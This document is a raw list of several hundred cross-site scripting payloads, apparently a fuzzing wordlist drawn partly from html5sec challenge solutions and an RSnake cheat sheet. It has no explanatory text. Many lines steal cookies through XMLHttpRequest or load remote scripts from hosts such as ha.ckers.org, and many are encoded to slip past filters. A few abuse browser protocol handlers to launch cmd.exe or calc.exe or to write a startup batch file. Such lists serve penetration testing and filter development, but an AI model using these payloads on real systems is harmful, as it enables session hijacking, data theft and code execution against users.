'';!--"<XSS>=&{()}
\"><script>alert(0x000123)</script>
\"><sCriPt>alert(0x000123)</sCriPt>
\"; alert(0x000123)
\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>
\"><img Src=0x94 onerror=alert(0x000123)>
\"><BODY ONLOAD=alert(0x000123)>
'%2Balert(0x000123)%2B'
\"><0x000123>
'+alert(0x000123)+'
%2Balert(0x000123)%2B'
'\"--></style></script><script>alert(0x000123)</script>
'</style></script><script>alert(0x000123)</script>
</script><script>alert(0x000123)</script>
</style></script><script>alert(0x000123)</script>
%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C
'\"--></style></script><script>alert(0x000123)</script>
';alert(0x000123)'
<scr<script>ipt>alert(0x000123)</script>
<scr<script>ipt>alert(0x000123)</scr</script>ipt>
\"<scr<script>ipt>alert(0x000123)</scr</script>ipt>
\"><scr<script>ipt>alert(0x000123)</script>
\">'</style></script><script>alert(0x000123)</script>
\"></script><script>alert(0x000123)</script>
\"></style></script><script>alert(0x000123)</script>  
aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
<<scr\0ipt/src=http://xss.com/xss.js></script
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
' onmouseover=alert(/Black.Spook/)
"><iframe%20src="http://google.com"%%203E
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
x”</title><img src%3dx onerror%3dalert(1)>
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
<script>alert(document.head.innerHTML.substr(146,20));</script>
<script>alert(document.head.childNodes[3].text)</script>
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> 
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
<var onmouseover="prompt(1)">On Mouse Over</var>?
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
<svg><script ?>alert(1)
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script ?
<img src ?itworksonchrome?\/onerror = alert(1)???
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
"><img src=x onerror=prompt(1);>
# credit to rsnake
<SCRIPT>alert('XSS');</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<IMG SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
\";alert('XSS');//
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="mocha:[code]">
<IMG SRC="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<XSS STYLE='no\xss:noxss("*//*");
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
getURL("javascript:alert('XSS')")
a="get";
<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<HTML><BODY>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<script>alert(1234)</script>
<script>prompt(1234)</script>
<ScripT>alert(1234)</ScRipT>
/<script>alert(1234)</script>
<script>var m=<html><a href="//host">link</a>
<img+src="http://localhost">
<DIV+STYLE="background-image: url(javascript:alert(1))">
<IMG+DYNSRC="javascript:alert(1);">
<IMG+LOWSRC="javascript:alert(1);">
<isindex+type=image+src=1+onerror=alert(1)>
<meta style="xss:expression(open(alert(1)))" />
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1);\">
<!</textarea <body onload='alert(1)'>
<img+<iframe ="1" onerror="alert(1)">
<iframe src="http://localhost"></iframe>
<base+href="javascript:alert(1);//">
<bgsound+src="javascript:alert(1);">
<INPUT+TYPE="IMAGE"+SRC="javascript:alert(1);">
<object+data="javascript:alert(0)">
<STYLE>li+{list-style-image:url("javascript:alert(1)");}</STYLE><UL><LI>1
<Layer+src="http://localhost">
%3E%3Cbody%20onload=javascript:alert(1)%3E
'">><marquee><h1>1</h1></marquee>
</br style=a:expression(alert(1))>
<font style='color:expression(alert(1))'>
<embed src="data:image/svg+xml;>
<frameset><frame src="xss"></frameset>
<link href="http://host/xss.css">
"/>%3ciframe%20src%3djavascript%3aalert%283%29%3e
<object><param name="src" value="javascript:alert(0)"></param></object>
<isindex action=javascript:alert(1) type=image>
<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>
</a onmousemove="alert(1)">
